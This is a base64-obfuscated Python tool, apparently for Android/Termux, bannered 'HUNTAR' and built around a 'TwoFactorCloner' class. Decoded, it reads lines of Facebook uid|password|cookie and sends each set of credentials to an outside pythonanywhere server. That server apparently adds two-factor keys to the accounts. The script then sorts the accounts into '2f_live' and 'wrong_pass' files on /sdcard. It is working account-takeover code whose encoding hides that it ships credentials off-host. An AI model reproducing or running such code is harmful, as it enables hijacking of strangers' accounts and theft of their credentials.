import base64
exec(base64.b64decode(b'IGltcG9ydCBvcyx6bGliCgpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgb3NSVUIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGNtZApvcy5zeXN0ZW0oJ2NsZWFyJykKcHJpbnQoJ1wwMzNbOTI7MW0+PlwwMzNbMTszN20gSW5zdGFsbGluZyBtaXNzaW5nIG1vZHVsZXMgLi4uJykKb3Muc3lzdGVtKCdwaXAgdW5pbnN0YWxsIHJlcXVlc3RzIGNoYXJkZXQgdXJsbGliMyBpZG5hIGNlcnRpZmkgLXk7cGlwIGluc3RhbGwgY2hhcmRldCB1cmxsaWIzIGlkbmEgY2VydGlmaSByZXF1ZXN0cyBiczQnKQp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMKZXhjZXB0IEltcG9ydEVycm9yOgogICAgcHJpbnQoJ1xuXDAzM1s5MjsxbT4+XDAzM1sxOzM3bSBJbnN0YWxsaW5nIHJlcXVlc3RzICEuLi5cbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKICAgIAoKdHJ5OgogICAgaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgnXG5cMDMzWzkyOzFtPj5cMDMzWzE7MzdtIEluc3RhbGxpbmcgZnV0dXJlcyAhLi4uXG4nKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmdXR1cmVzJykKdHJ5OgogICAgaW1wb3J0IGJzNApleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KCdcblwwMzNbOTI7MW0+PlwwMzNbMTszN20gSW5zdGFsbGluZyBiczQgIS4uLlxuJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykKICAgIAogICAgdGltZS5zbGVlcCgxLjUpCiAgICBvcy5zeXN0ZW0oJ2dpdCBwdWxsJykKCiAgICBvcy5zeXN0ZW0oJ3BrZyBpbnN0YWxsIGN1cmwnKQp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMgCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcblwwMzNbOTI7MW0+PlwwMzNbMTszN20gSW5zdGFsbGluZyBSZXF1ZXN0cyAuLi5cbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKCgp0cnk6CiAgICBpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcblwwMzNbOTI7MW0+PlwwMzNbMTszN20gSW5zdGFsbGluZyBmdXR1cmVzIC4uLlxuJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgZnV0dXJlcycpCgp0cnk6CiAgICBpbXBvcnQgbWVjaGFuaXplCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOgogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgPiAvZGV2L251bGwnKQoKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgppbXBvcnQgb3MsIHJlcXVlc3RzLCByZSxwbGF0Zm9ybSwgc3lzLCByYW5kb20sIHN1YnByb2Nlc3MsIHRocmVhZGluZywgaXRlcnRvb2xzLGJhc2U2NCx1dWlkLHpsaWIscmUsanNvbix1dWlkLHN1YnByb2Nlc3Msc2h1dGlsLHdlYmJyb3dzZXIsdGltZSxqc29uLHN5cyxyYW5kb20sZGF0ZXRpbWUsdGltZSxyZSxzdWJwcm9jZXNzLHBsYXRmb3JtLHN0cmluZyxqc29uLHRpbWUscmUscmFuZG9tLHN5cyxzdHJpbmcsdXVpZApmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIFhpeWFkWGl5YWQKZnJvbSBzdHJpbmcgaW1wb3J0ICogCmZyb20gcmFuZG9tIGltcG9ydCByYW5kaW50CmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgc2xwCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBjbWQKZnJvbSB6bGliIGltcG9ydCBkZWNvbXByZXNzIAppbXBvcnQgb3MsIHBsYXRmb3JtCnRyeTpvcy5ta2RpcignL3NkY2FyZC9YRC0yRicpCmV4Y2VwdDpwYXNzCiAKY2xhc3MgVHdvRmFjdG9yQ2xvbmVyOgogICAgR1JFRU4gPSAnXHgxYlsxOzkybScKICAgIFJFRCA9ICdceDFiWzE7OTFtJwogICAgWUVMTE9XID0gJ1x4MWJbMTs5M20nCiAgICBXSElURSA9ICdceDFiWzE7OTdtJwogICAgCiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5vayA9IDAKICAgICAgICBzZWxmLmZhaWwgPSAwCiAgICAgICAgCiAKICAgIGRlZiBBVVRPXzJGKHNlbGYsIHVpZCwgcGFzc3dvcmQsIGNvb2tpZSk6CiAgICAgICAgaWYgInNiPSIgbm90IGluIGNvb2tpZToKICAgICAgICAgICAgc2IgPSBiYXNlNjQuYjY0ZW5jb2RlKG9zLnVyYW5kb20oMTgpKS5kZWNvZGUoKS5yZXBsYWNlKCI9IiwiIikucmVwbGFjZSgiKyIsIl8iKS5yZXBsYWNlKCIvIiwiLSIpCiAgICAgICAgICAgIGNvb2tpZSA9IGYic2I9e3NifTt7Y29va2llfSIKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXNzCiAgICAgICAgY29va2llcyA9IHsiQ29va2llIiA6IGNvb2tpZX0KICAgICAgICBsaW5rID0gZiJodHRwczovL2xpdmVkZWFkc2Vncy5weXRob25hbnl3aGVyZS5jb20vVFdPX0ZBQ1RPUj91aWQ9e3VpZH0mcGFzc3dvcmQ9e3Bhc3N3b3JkfSZjb29raWU9e2Nvb2tpZX0iCiAgICAgICAgc2VuZF9yZXEgPSByZXF1ZXN0cy5nZXQobGluaykudGV4dAogICAgICAgIHJldHVybiBzZW5kX3JlcQoKICAgIGRlZiBkaXZpZGVyKHNlbGYpOgogICAgICAgIHByaW50KGYiXDMzWzE7MzdtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIiIikKCiAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgIHByaW50KGYiIGRiICAgIGRiIGQ4ODg4ODhiIGRiICAgIGRiICAuZDhiLiAgZDg4ODhiLiAgICIpCiAgICAgICAgcHJpbnQoZiIgYDhiICBkOCcgICBgODgnICAgYDhiICBkOCcgZDgnIGA4YiA4OCAgYDhEICIpCiAgICAgICAgcHJpbnQoZiIgIGA4YmQ4JyAgICAgODggICAgIGA4YmQ4JyAgODhvb284OCA4OCAgIDg4ICAgIikKICAgICAgICBwcmludChmIiAgLmRQWWIuICAgICA4OCAgICAgICA4OCAgICA4OH5+fjg4IDg4ICAgODgiKQogICAgICAgIHByaW50KGYiIC44UCAgWTguICAgLjg4LiAgICAgIDg4ICAgIDg4ICAgODggODggIC44RCAgICIpCiAgICAgICAgcHJpbnQoZiIgWVAgICAgWVAgWTg4ODg4OFAgICAgWVAgICAgWVAgICBZUCBZODg4OEQnICBcMDMzWzkyOzFtSCBcMDMzWzE7MzdtVSBcMDMzWzkyOzFtTiBcMDMzWzE7MzdtVCBcMDMzWzkyOzFtQSBcMDMzWzE7MzdtUiIpCiAgICAgICAgcHJpbnQoZiJcMzNbMTszN20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIiIiKQogICAgICAgIHByaW50KGYiXDAzM1s5MjsxbT4+ICBcMDMzWzE7MzdtT3duZXIgICAgICAgIFwwMzNbMTszMm0gOiAgXDAzM1s5MjsxbUggXDAzM1sxOzM3bVUgXDAzM1s5MjsxbU4gXDAzM1sxOzM3bVQgXDAzM1s5MjsxbUEgXDAzM1sxOzM3bVIiKQogICAgICAgIHByaW50KGYiXDAzM1s5MjsxbT4+ICBcMDMzWzE7MzdtRmFjZWJvb2sgICAgIFwwMzNbMTszMm0gOlwwMzNbMTs5N20gIE11aGFtbWFkIEhhc3NhbiIpCiAgICAgICAgcHJpbnQoZiJcMDMzWzkyOzFtPj4gIFwwMzNbMTszN21GYWNlYm9vayBVc2VyXDAzM1sxOzMybSA6XDAzM1sxOzk3bSAgZXJvci40MDQiKQogICAgICAgIHByaW50KGYiXDAzM1s5MjsxbT4+ICBcMDMzWzE7MzdtR2l0aHViICAgICAgIFwwMzNbMTszMm0gOlwwMzNbMTs5N20gIE1oa2luZzg5NyIpCiAgICAgICAgcHJpbnQoZiJcMDMzWzkyOzFtPj4gIFwwMzNbMTszN21Ub29sIFR5cGUgICAgXDAzM1sxOzMybSA6XDAzM1sxOzk3bSAgXDAzM1s5MTsxbTJGRiIpCiAgICAgICAgcHJpbnQoZiJcMDMzWzkyOzFtPj4gIFwwMzNbMTszN21WZXJzaW9uICAgICAgXDAzM1sxOzMybSA6XDAzM1sxOzk3bSAgXDAzM1s5MTsxbVByZXNub2wiKQogICAgICAgIHNlbGYuZGl2aWRlcigpCiAgICAgICAgZ2V0X2ZpbGUgPSBpbnB1dCgiXDAzM1sxOzM3bUVudGVyIGZpbGUgcGF0aDpcMDMzWzkyOzFtICIpCiAgICAgICAgc2VsZi5kaXZpZGVyKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGdldF9maWxlX2luZm8gPSBvcGVuKGdldF9maWxlLCAncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkKICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgIGV4aXQoIlwwMzNbOTI7MW0+PlwwMzNbOTE7MW1GaWxlIG5vdCBmb3VuZCIpCiAgICAgICAgICAgIHJ1bihzZWxmKQogICAgICAgIGZvciBlbGVtZW50IGluIGdldF9maWxlX2luZm86CiAgICAgICAgICAgIGlmIGVsZW1lbnQgPT0gIiI6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB1aWQsIHBhc3N3b3JkLCBjb29raWUgPSBlbGVtZW50LnNwbGl0KCJ8IikKICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgICAgICAgICBzZWxmLmRpdmlkZXIoKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7c2VsZi5ZRUxMT1d9W1dST05HIEZPUk1BVF0gIiArIGVsZW1lbnQpCiAgICAgICAgICAgICAgICBzZWxmLmRpdmlkZXIoKQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCIvc2RjYXJkL1hELTJGL3dyb25nX2Zvcm1hdC50eHQiLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShlbGVtZW50ICsgJ1xuJykKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGRhdGEgPSBzZWxmLkFVVE9fMkYodWlkPXVpZCwgcGFzc3dvcmQ9cGFzc3dvcmQsIGNvb2tpZT1jb29raWUpCiAgICAgICAgICAgIGlmICdbMkZdJyBpbiBkYXRhOgogICAgICAgICAgICAgICAgZGF0YXggPSBkYXRhLnJlcGxhY2UoIlsyRl0gIiwgIiIpCiAgICAgICAgICAgICAgICBwcmludChmIntzZWxmLkdSRUVOfVtYRF0tWzJGXSB7ZGF0YXh9IikKICAgICAgICAgICAgICAgIHNlbGYub2sgKz0gMQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCIvc2RjYXJkL1hELTJGLzJmX2xpdmUudHh0IiwgJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZWxlbWVudCArICdcbicpCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oIi9zZGNhcmQvWEQtMkYvMmZfbGl2ZV93aXRoX2tleS50eHQiLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShkYXRheCArICdcbicpCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oIi9zZGNhcmQvWEQtMkYvMmZfbGl2ZV93aXRoX2Nvb2tpZXMudHh0IiwgImEiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7ZGF0YXh9fHtjb29raWV9XG4iKQogICAgICAgICAgICBlbGlmICdDb29raWVzIGxvbCcgaW4gZGF0YToKICAgICAgICAgICAgICAgIHByaW50KGYie3NlbGYuUkVEfVtYRF0tW0ZMXSB7ZGF0YX0iKQogICAgICAgICAgICAgICAgc2VsZi5mYWlsICs9IDEKICAgICAgICAgICAgICAgIHdpdGggb3BlbigiL3NkY2FyZC8yZl9mYWlsZWQudHh0IiwgJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZWxlbWVudCArICdcbicpCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oIi9zZGNhcmQvWEQtMkYvMmZfZmFpbGVkX3VpZC50eHQiLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmInt1aWR9fHtwYXNzd29yZH1cbiIpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVsaWYgJ3dyb25nIHBhc3N3b3JkJyBpbiBkYXRhOgogICAgICAgICAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzRtW1hEXS1bV1JdIHtkYXRhfSIpCiAgICAgICAgICAgICAgICBzZWxmLmZhaWwgKz0gMQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCIvc2RjYXJkL1hELTJGL3dyb25nX3Bhc3MudHh0IiwgJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZWxlbWVudCArICdcbicpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludCgiRXJyb3IiICsgZGF0YSkKIAogICAgICAgIHNlbGYuZGl2aWRlcigpCiAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzdtVG90YWwgQ2hlY2tlZCB1aWQgOlwwMzNbMTszNG17bGVuKGdldF9maWxlX2luZm8pfSAiKQogICAgICAgIHByaW50KGYiXDAzM1sxOzM3bTJGIHN1Y2Nlc3NmdWwgOiBcMDMzWzE7MzJte3N0cihzZWxmLm9rKX0iKQogICAgICAgIHByaW50KGYiXDAzM1sxOzM3bTJGIEZhaWxlZDogXDAzM1sxOzMxbXtzdHIoc2VsZi5mYWlsKX0iKQogICAgICAgIHNlbGYuZGl2aWRlcigpCiAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzdtUlVOIFRPIEJBQ0sgICIpCiAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzRtcHl0aG9uIEh1bnRhci5weSIpCiAgICAgICAgc2VsZi5kaXZpZGVyKCkKICAgICAgICAKICAgICAgICAKICAgICAgICAKIAppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgY2xvbmVyID0gVHdvRmFjdG9yQ2xvbmVyKCkKICAgIGNsb25lci5ydW4oKQog'))
